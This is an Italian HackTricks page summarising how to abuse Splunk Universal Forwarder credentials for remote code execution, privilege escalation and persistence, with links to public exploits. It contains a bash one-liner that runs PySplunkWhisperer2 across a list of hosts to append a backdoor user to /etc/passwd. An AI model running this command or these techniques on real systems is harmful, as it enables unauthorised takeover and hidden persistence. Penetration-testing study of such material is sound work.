# Splunk LPE e Persistenza

{% hint style="success" %}
Impara e pratica il hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Impara e pratica il hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Supporta HackTricks</summary>

* Controlla i [**piani di abbonamento**](https://github.com/sponsors/carlospolop)!
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Condividi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos su github.

</details>
{% endhint %}

Se **enumerando** una macchina **internamente** o **esternamente** trovi **Splunk in esecuzione** (porta 8090), se per fortuna conosci delle **credenziali valide** puoi **sfruttare il servizio Splunk** per **eseguire una shell** come l'utente che esegue Splunk. Se è in esecuzione come root, puoi elevare i privilegi a root.

Inoltre, se sei **già root e il servizio Splunk non ascolta solo su localhost**, puoi **rubare** il file **della password** **dal** servizio Splunk e **crackare** le password, o **aggiungere nuove** credenziali ad esso. E mantenere la persistenza sull'host.

Nella prima immagine qui sotto puoi vedere come appare una pagina web di Splunkd.

## Riepilogo dell'Exploit dell'Agente Splunk Universal Forwarder

Per ulteriori dettagli controlla il post [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/). Questo è solo un riepilogo:

**Panoramica dell'Exploit:**
Un exploit che prende di mira l'Agente Splunk Universal Forwarder (UF) consente agli attaccanti con la password dell'agente di eseguire codice arbitrario sui sistemi che eseguono l'agente, compromettendo potenzialmente un'intera rete.

**Punti Chiave:**
- L'agente UF non convalida le connessioni in arrivo o l'autenticità del codice, rendendolo vulnerabile all'esecuzione non autorizzata di codice.
- I metodi comuni per acquisire password includono la loro localizzazione in directory di rete, condivisioni di file o documentazione interna.
- Un exploit riuscito può portare a accesso a livello SYSTEM o root su host compromessi, esfiltrazione di dati e ulteriore infiltrazione nella rete.

**Esecuzione dell'Exploit:**
1. L'attaccante ottiene la password dell'agente UF.
2. Utilizza l'API di Splunk per inviare comandi o script agli agenti.
3. Le azioni possibili includono estrazione di file, manipolazione di account utente e compromissione del sistema.

**Impatto:**
- Compromissione completa della rete con permessi a livello SYSTEM/root su ogni host.
- Potenziale per disabilitare il logging per evitare il rilevamento.
- Installazione di backdoor o ransomware.

**Esempio di Comando per l'Exploitation:**
```bash
for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
```
**Sfruttamenti pubblici utilizzabili:**
* https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2
* https://www.exploit-db.com/exploits/46238
* https://www.exploit-db.com/exploits/46487


## Abusare delle query di Splunk

**Per ulteriori dettagli controlla il post [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis)**

{% hint style="success" %}
Impara e pratica il hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Impara e pratica il hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Supporta HackTricks</summary>

* Controlla i [**piani di abbonamento**](https://github.com/sponsors/carlospolop)!
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Condividi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos su github.

</details>
{% endhint %}
